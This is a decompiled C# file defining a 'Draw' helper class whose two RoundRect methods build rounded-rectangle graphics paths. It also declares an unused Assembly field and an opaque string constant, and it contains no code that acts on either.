using System.Drawing;
using System.Drawing.Drawing2D;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;

namespace ASCAvSvc;

[StandardModule]
internal sealed class Draw
{
	public static Assembly asmmb;

	public static string smartdef = "CLiMnnxHurNAdSXUdSZJuwD5OepAGHE7QY1H8emXUxHhHuOI2idKBpxZyajvhLwQAMpJZtIad7aCcbjEEAKUEXpkso";

	public static GraphicsPath RoundRect(Rectangle Rectangle, int Curve)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		GraphicsPath val = new GraphicsPath();
		checked
		{
			int num = Curve * 2;
			val.AddArc(new Rectangle(Rectangle.X, Rectangle.Y, num, num), -180f, 90f);
			val.AddArc(new Rectangle(Rectangle.Width - num + Rectangle.X, Rectangle.Y, num, num), -90f, 90f);
			val.AddArc(new Rectangle(Rectangle.Width - num + Rectangle.X, Rectangle.Height - num + Rectangle.Y, num, num), 0f, 90f);
			val.AddArc(new Rectangle(Rectangle.X, Rectangle.Height - num + Rectangle.Y, num, num), 90f, 90f);
			val.AddLine(new Point(Rectangle.X, Rectangle.Height - num + Rectangle.Y), new Point(Rectangle.X, Curve + Rectangle.Y));
			return val;
		}
	}

	public static GraphicsPath RoundRect(int X, int Y, int Width, int Height, int Curve)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		Rectangle rectangle = new Rectangle(X, Y, Width, Height);
		GraphicsPath val = new GraphicsPath();
		checked
		{
			int num = Curve * 2;
			val.AddArc(new Rectangle(rectangle.X, rectangle.Y, num, num), -180f, 90f);
			val.AddArc(new Rectangle(rectangle.Width - num + rectangle.X, rectangle.Y, num, num), -90f, 90f);
			val.AddArc(new Rectangle(rectangle.Width - num + rectangle.X, rectangle.Height - num + rectangle.Y, num, num), 0f, 90f);
			val.AddArc(new Rectangle(rectangle.X, rectangle.Height - num + rectangle.Y, num, num), 90f, 90f);
			val.AddLine(new Point(rectangle.X, rectangle.Height - num + rectangle.Y), new Point(rectangle.X, Curve + rectangle.Y));
			return val;
		}
	}
}
